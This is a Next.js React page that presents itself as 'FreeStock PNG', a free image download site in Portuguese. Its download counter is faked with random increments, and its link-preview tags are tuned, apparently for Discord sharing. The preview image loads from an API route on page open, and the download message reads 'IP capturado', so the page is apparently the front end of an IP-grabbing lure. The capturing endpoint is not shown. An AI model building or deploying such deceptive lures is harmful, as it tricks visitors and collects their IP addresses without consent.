import { useState, useEffect } from 'react';
import Head from 'next/head';

export default function HomePage() {
  const [downloadCount, setDownloadCount] = useState(1247);
  const [showNotification, setShowNotification] = useState(false);

  useEffect(() => {
    const interval = setInterval(() => {
      setDownloadCount(prev => prev + Math.floor(Math.random() * 3));
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleDownload = (url) => {
    setShowNotification(true);
    setDownloadCount(prev => prev + 1);
    window.open(url, '_blank');
    setTimeout(() => setShowNotification(false), 3000);
  };

  return (
    <>
      {/* 🔥 ISSO AQUI É O QUE REMOVE A BANDEIRA 🇧🇷 */}
      <Head>
        <title>FreeStock PNG</title>

        <meta property="og:title" content="FreeStock PNG" />
        <meta property="og:description" content="Baixe imagens PNG gratuitamente" />
        <meta property="og:image" content="https://estudos-three-pink.vercel.app/foto-discord2.png" />
        <meta property="og:type" content="website" />

        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:image" content="https://estudos-three-pink.vercel.app/foto-discord2.png" />
      </Head>

      <div style={{ padding: 40, fontFamily: 'system-ui' }}>
        <h1>🖼️ FreeStock PNG</h1>

        <img
          src="/api/imagem.png"
          alt="Preview"
          style={{ width: 320, borderRadius: 12 }}
        />

        <br /><br />

        <button onClick={() => handleDownload('/api/imagem.png')}>
          ⬇️ Download PNG
        </button>

        {showNotification && (
          <p style={{ marginTop: 20, color: 'green' }}>
            Download iniciado (IP capturado)
          </p>
        )}
      </div>
    </>
  );
}
